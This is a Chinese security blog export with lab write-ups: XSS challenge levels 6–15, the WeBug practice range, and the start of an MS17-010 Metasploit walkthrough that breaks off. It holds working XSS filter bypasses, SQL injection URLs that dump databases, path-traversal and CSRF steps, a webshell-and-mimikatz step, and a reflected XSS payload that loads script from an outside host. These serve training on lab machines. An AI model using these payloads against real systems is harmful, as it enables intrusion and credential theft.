某个键盘的键被松开 1 4 3 onload 某个页面或图像被完成加载 1 2 3 onmousedown 某个鼠标按键被按下 1 4 4 onmousemove 鼠标被移动 1 6 3 onmouseout 鼠标从某元素移开 1 4 4 onmouseover 鼠标被移到某元素之上 1 2 3 onmouseup 某个鼠标按键被松开 1 4 4 onreset 重置按钮被点击 1 3 4 onresize 窗口或框架被调整尺寸 1 4 4 onselect 文本被选定 1 2 3 onsubmit 提交按钮被点击 1 2 3 onunload 用户退出页面 1 2 3 但是这串代码没有过滤&lt;字符和&gt;字符，那么我们可以使用标签的href属性构造payload进行弹窗 1&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt; 或者使用 1&quot;&gt;&lt;a href=&quot;javascript:onclick=alert()&quot;&gt;xss&lt;/a&gt; 点击xss按钮即可弹窗，但是我不是很明白第二个payload，因为前面的PHP代码已经将on替换成0_n那么onclick不就变成了o_nclick，那么这个如何弹窗呢？我表示很困惑。。。。。后来发现网站并未将onclick中的on替换成o_n，所以便可以弹框。 Level 6：123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; emmmmm，看着这个代码过滤了很多的字符串，但是并没有进行大小写判定,很是好玩 1&quot;&gt;&lt;ScRipT&gt;alert(/xss/)&lt;/ScrIpt&gt; 1&quot;ONclick=&quot;window.alert() 1&quot;&gt;&lt;a HrEf=&quot;javascript:onclick=alert()&quot;&gt;xss&lt;/a&gt; Level 7：123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看源码，发现了网站对传入的参数进行了小写转换，并且将一些特殊值替换成空，那么我们可以将其进行双写绕过 1&quot;&gt;&lt;Scrscriptipt&gt;alert(/xss/)&lt;/scriScriptpt&gt; 1&quot;OonNclick=&quot;window.alert() 1&quot;&gt;&lt;a hrhrefef=javascriscriptpt:onclick=alert()&gt;xss&lt;/a&gt; 1&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert()&gt;xss&lt;/a&gt; Level 8：1234567891011121314151617181920212223&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str); //将script替换成scr_ipt$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); //将on替换成o_n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6); //将双引号替换成&amp;quotecho &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt; //将所获取到的字符串进行HTML编码&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?php echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; //通过href属性将￥str7变量输出到页面?&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt; 后台做了三个措施：将特殊字符替换/将获取到的字符串进行HTML编码/通过href属性将处理后得值输出 网上的教程是将伪协议JavaScript：alert（1）中的script的一个字符进行HTML编码绕过防护 1javascri&amp;#x70;t:alert() 或者 1javascri&amp;#112;t:alert() Level 9:123456789101112131415161718192021222324252627282930&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;)) //如果str7中没有http：//&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; //则报错 &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt; 那么我们可以构造payload： 1javascri&amp;#x0070;t:alert(1)/*http://www.baidu.com*/ 只要让程序检测到http://但不让这个生效即可，可以采用注释的方法构造payload。 Level 10：1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号&lt;&gt;都被转换成空，还有三个hidden的隐藏输入框， 或许我们可以从隐藏的输入框下手 构造payload为： 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1) 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1) 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1` Level 11：查看后台代码 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;]; //获取HTTP的REFERER头部信息$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11); //将所获取到的referer中的&gt;替换为空$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); //将变量$str22中的&lt;替换成空echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; //在这里进行注入&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现可以对referer头部注入 我们burp抓包，添加Referer头部，插入payload 123456789GET /xss/level11.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeReferer: &quot;onclick=alert(1) type=&quot;text&quot; //所添加的Referer头部 forward转发，关掉代理，点击页面的框即可弹窗成功！ Level 12：第12关和第11关蛮相似的，12关是对UA头部进行xss注入 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; payload为： 123456789GET /xss/level12.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: &quot; onmouseover=alert(1) type=&quot;text&quot; //修改User-Agent值Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: user=call+me+maybe%3FConnection: close Level 13：1234567891011121314151617&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600); //setcookie函数用于向客户端发送一个cookie值ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;]; //使用$_COOKIE变量来取回cookie中user的值$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; //再此进行注入&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现是xss进行的cookie注入，那么抓包修改cookie即可 123456789GET /xss/level13.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: user=&quot; onclick=alert(1) type=&quot;text&quot;Connection: close Level 14：查看源码 12&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt; payload： 1&quot;&gt;&lt;img src=1 onerror=alert(1)&gt; Level 15：12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;?&gt; ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 其payload为： 1src=level1.php?name=1&apos;window.alert() 或者包含第一关 1src=&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos; 参考文章：https://www.jianshu.com/p/06c644dafa0d ​ https://www.cnblogs.com/bmjoker/p/9446472.html]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebBug靶机实验]]></title>
    <url>%2F2019%2F02%2F25%2FWebBug%E9%9D%B6%E6%9C%BA%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[男儿不展同云志，空负天生八尺躯! weBug环境介绍: WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入门。 WeBug安装使用: 此安装包webug是3.0版本，所有的漏洞环境都已经搭建好了，解压后只要在vm虚拟机内打开，就可直接使用测试，无需繁琐的环境配置。具体操作：用winrar将安装包解压，用VM虚拟机打开解压文件里的win2003虚拟机文件。进入虚拟机系统后，打开命令行，输入：ipconfig，查看虚拟机的IP地址，然后直接在物理机的浏览器上输入该IP地址，就可以直接进入靶场了。 WeBug包含的漏洞: 目前该靶场包含以下漏洞（超全！特别适合练手）:get注入；图片破解；信息收集练习——目录端口收集；暴力破解练习；x-forwarded-for注入；支付漏洞；垂直越权；CSRF；url跳转；GET任意文件下载；POST任意文件下载；无验证上传；反射型XSS；存储型XSS；校验扩展名上传；验证来源去向的url跳转；文件包含；POST文件包含；HOST注入；APK破解；延时注入；DZ7.2论坛sql注入；aspcms注入；phpmyadmin任意文件包含漏洞；齐博系统SQL注入；海盗云商getshell；PHP168任意代码执行GET SHELL；ecshop 注入；ShopXp系统SQL注射漏洞；Dcore(轻型CMS系统)注入漏洞；MetInfo 任意文件包含漏洞可getshell；Metinfo news.php盲注；Metinfo img.php盲注；万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入；BEESCMS sql注入，无视防御；ourphp 注入；phpwind 命令执行漏洞；metinfo 任意用户密码修改；DZ 3.2 存储型XSS；DedeCMS flink.php友情链接注入；DedeCms?recommend.php注入；BEESCMS 小于等于V4四处注入+无需密码直接进后台；海洋 x-forwarded-for注入；php截断利用；st2-016；jboss命令执行；tomcat弱口令；hfs远程命令执行；st2-052命令执行；flash远程命令执行；gh0st远程溢出；IIS6.0远程溢出下载链接：https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ提取码：cfyr 第一关:普通的GET注入提交id为1,出现编号1的商品,输入1’,系统出现查询数据库错误的提示那么接下来爆系统SQL语句查询的字段个数,其payload为:1’ order by 5–+将数字5换成4,结果返回正常,证明其查询的字段数是4个 然后爆字段所在位置,其payload为:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,4--+ 得到查询的字段分别位于”编号”,”名称”,”价格”,”数量”的位置 查询当前用户,数据库版本,当前数据库名,其payload为:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,user(),version(),database()--+ 当前用户:root@localhost版本为:5.5.53数据库名:pentesterlab查所有数据库库名:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(schema_name)from information_schema.schemata --+ 得到的数据库为:information_schema,beecms,dedecmsv57gbk,dedecmsv57gbksp1,deescms,discuz,ecshop1,haidao,hiwiki,merinfo3,metinfo1,metinfo2,metinfoxiugai,mysql,ourphp,pentesterlab,performance_schema,php168,phpwind,qibo,seacms,test,ultrax,wanzhong,wiki,wiki11 查当前数据库中的表:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema=&apos;pentesterlab&apos;--+ 得到的当前数据库pentesterlab中的所有表名:comment,flag,goods,user 查找flag表中的列名:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;--+ 结果为:id,flag查看其值:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(id,0x7e,flag)from flag--+ 结果为:1~204f704fbbcf6acf398ffee11989b377 第二关: 从图中你能找到什么?将图片保存到本地,notepad++打开就发现密码啦,官方说这道题有问题…. 第三关:你看到了什么?查看源代码,原来是要扫目录呀,我用的是Windows系统,直接用御剑跑,Linux下可以用dirb或者dirbuster去跑 扫到了这个test目录,得到提示把目录名md5加密访问加密后的值得到flag 第四关:告诉你了FLAG是5位数遇到表单上burp爆破得到用户名admin.密码admin123但是登录了没反应,后来发现是源码有问题,作者将flag注释了…… 第五关:一个优点小小的特殊的注入X-Forwarded-For注入:https://www.freebuf.com/articles/web/164817.html两种方式解决这个问题(原理都是一样的)1,用burpsuite抓包,添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag第二种方式:使用火狐浏览器的Modify Headers,添加添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag,确定,刷新页面即可出现所查询的值 第六关:支付漏洞打开遇到个登录页面,爆破呗,得到账户名密码是tom/123456看着很像支付漏洞,抓包修改价格为0.1元,购买成功 第七关:越权问题使用系统提供的账号密码登录点击修改密码,发现是以GET请求的方式传递用户名进行修改密码的操作,那么尝试将用户名修改为admin用户,看能不能越权修改管理员账号payload:1http://192.168.239.131/pentest/test/3/change.php?name=admin 是可以修改admin的密码的,但是需要旧密码, 查看其源码,只要输入的两次新密码正确就可以修改啦,不对原密码进行确认:12345678if($pwd2==$pwd3)&#123; //更新记录$updateSql = &quot;update user set pwd = &apos;&quot;.$pwd2.&quot;&apos; where uid=&apos;&quot;.$uid.&quot;&apos;&quot;;$result = mysql_query($updateSql);if($result&gt;0)&#123; echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;更改密码成功，请重新登录！&apos;);location.href=&apos;index.html&apos;&lt;/script&gt;&quot;;&#125; 第八关:CSRF首先使用tom/123456登录,观察其URL为tom用户,将tom替换成admin即可修改管理员密码,然后输入新密码,burp抓包右键制作CSRF POC保存至一个HTML文件中,将访问该文件的网站链接发送给管理员,管理员一点击即可修改其密码为我刚刚修改之后的密码 第九关:URL跳转查看源码,发现index.php存在任意url跳转1234$url=$_REQUEST[&apos;url&apos;];if($url!=null||$url!=&quot;&quot;)&#123; echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;成功跳转！&apos;);location.href=&apos;&quot;.$url.&quot;&apos;&lt;/script&gt;&quot;;&#125; 那么其payload为:1http://192.168.239.131/pentest/test/5/index.php?url=www.baidu.com 第十关:GET类型任意下载漏洞打开链接提示404,查看源码源码又是源码写的有问题…..我们直接去访问download.php网址为:http://192.168.239.131/pentest/test/6/1/download.php点击下载,发现传递了一个参数fname 是下载的文件名 那么可能可以修改文件名实现任意文件下载,其payload为: 1http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/download.php 通过下载download.php这个文件证明存在任意文件下载漏洞,那么该去找存放管理员账号密码的文件我直接使用御剑扫描其后台,发现在http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件 那么构造的payload为:1http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php 第11关:POST类型任意下载漏洞第10关是通过GET请求下载文件,第11关是通过POST请求下载文件,直接修改变量pic的值为config.php文件的路径即可 第12关:D盘找密码上传个PHP木马,确定其上传路径直接传一句话木马，上传上去后，然后在菜刀中上传mimikatz得到系统管理员登录密码为123456~ 第13关:反射型XSS构造payload:1http://192.168.239.131/pentest/test/9/?id=&lt;script src=http://c7.gg/bSTkf&gt;&lt;/script&gt; 第14关:存储型XSS构造payload:1&lt;script&gt;alert(/xss/)&lt;/script&gt; 第15题:上传漏洞制作一个图片马,上传,burp修改文件名为php即可成功上传成功解析菜刀连接 第16题:明天双十一 我从公司网络去剁手了！折腾了一会没找到答案,查看源码 1234567891011121314151617if(strstr($url,&quot;www.taobao.com&quot;))&#123; if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; echo &quot;剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;; &#125;else&#123; echo &quot;不想剁手了&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;nono&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;哎呀，这里只允许10.10.10.10访问！！！&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;这个地方剁手不好，换个地方！&quot;; &#125; 发现必须要满足三个条件才可以获得flag1.请求参数url=www.taobao.com2.referer为www.baidu.com3.HOST值为10.10.10.10]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[与永恒之蓝的一场旅行]]></title>
    <url>%2F2019%2F02%2F19%2Fms17-010%2F</url>
    <content type="text"><![CDATA[不断进步,直到羔羊变成雄狮! 漏洞背景:继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。 针对此次泄露的漏洞，微软提前发布了安全公告 MS17-010，修复了泄露的多个 SMB 远程命令执行漏洞。由于此次泄露的漏洞覆盖了大部分常见的 Windows 版本(包括微软不再提供更新服务的 Windows XP 和 Windows Server 2003)，网络空间中仍然存在大量可被入侵的设备 漏洞原理:永恒之蓝漏洞是通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 影响版本:目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 目前在Metasploit上集成的攻击载荷是ms17_010_psexec和ms17_010_eternalblue,我在网上搜了好久,也没找到什么有价值的答案,我自己总结的是两点区别: 一:ms17_010_psexec是SMB的远程代码执行漏洞,ms17_010_eternalblue是SMB的远程窗口内核池损坏漏洞 二:ms17_010_psexec是针对于上述所说的Windows系统都适用的,而ms17_010_eternalblue只适用于win7和win server2008R2的全版本 这次我们使用ms17_010_psexec载荷进行渗透测试 利用前提:1.防火墙必须允许SMB流量出入 2.目标必须使用SMBv1协议 3.目标必须缺少MS17-010补丁 4.目标必须允许匿名IPC $和管道名 复现环境:攻击机:kali 4.15.0-kali2-amd64(192.168.135.134) 靶机:Windows server2003(192.168.135.136) 复现过程:信息收集使用nmap对目标系统进行信息收集同时去扫描目标存在的漏洞(Nessus或者AWVS等扫描器都可以) 1root@kali:~# nmap -sV --script=vuln -O 192.168.135.136 参数-sV表示对目标主机进行软件版本的检测 参数–script=vuln表示适用nmap自带的漏洞库区扫描目标系统存在的漏洞 参数-O表示扫描目标的操作系统 由于nmap默认扫描常用的一千个端口,所以我这里为了节省时间就没有加-p选项 扫出来啦鼎鼎有名的ms08-067漏洞和ms17-010漏洞这两个远程代码执行的漏洞 1234567891011121314Host script results:| smb-vuln-ms08-067: | VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.| | Disclosure date: 2008-10-23| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx 1234567891011121314smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 漏洞利用:配置数据库我们使用Metasploit-Framework(简称MSF)去利用ms17-010远程代码执行漏洞 我们首先需要创建一个自己的数据库,将等会使用MSF获取的结果保存到我们自己的数据库中(也可以使用metasploit自带的数据库),MSF默认使用的数据库管理系统是PostgreSQL 打开Postgresql服务: 1root@kali:~# service postgresql start 或者 12root@kali:~# /etc/init.d/postgresql start[ ok ] Starting postgresql (via systemctl): postgresql.service. 查看数据库运行状态: 123456789root@kali:~# service postgresql status ● postgresql.service - PostgreSQL RDBMS Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled) Active: active (exited) since Mon 2019-02-18 16:22:16 CST; 24h ago Process: 11732 ExecStart=/bin/true (code=exited, status=0/SUCCESS) Main PID: 11732 (code=exited, status=0/SUCCESS)2月 18 16:22:16 kali systemd[1]: Starting PostgreSQL RDBMS...2月 18 16:22:16 kali systemd[1]: Started PostgreSQL RDBMS. 切换到postgres用户(Postgresql数据库管理系统所创建的用户) 1root@kali:~# su - postgres 创建数据库管理员kkk: 1234root@kali:~# su - postgres postgres@kali:~$ createuser kkk -P为新角色输入的口令: 再输入一遍: 创建数据库及其属主,其语法为createdb –owner=属主 数据库名 1postgres@kali:~$ createdb --owner=kkk database1 然后就可以打开MSF终端利用漏洞啦 1root@kali:~# msfconsole 查看当前所连接的数据库: 12msf &gt; db_status [*] postgresql connected to msf 断开连接,连接我们刚刚创建的数据库, 断开数据库连接命令:db_disconnent 连接新的数据库:格式是db_connect 用户名:密码@127.0.0.1/数据库名 12msf &gt; db_disconnect msf &gt; db_connect kkk:passwd@127.0.0.1/database1 确认漏洞这部分其实就是确认nmap扫描的结果是否准确,MSF提供专门扫描MS17-010的payload(载荷)我们可以在这里尝试一番,熟悉命令 123456789101112msf &gt; search ms17-010 //在漏洞库中搜索ms17-010的payload[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/smb/ms17_010_command 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_psexec 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 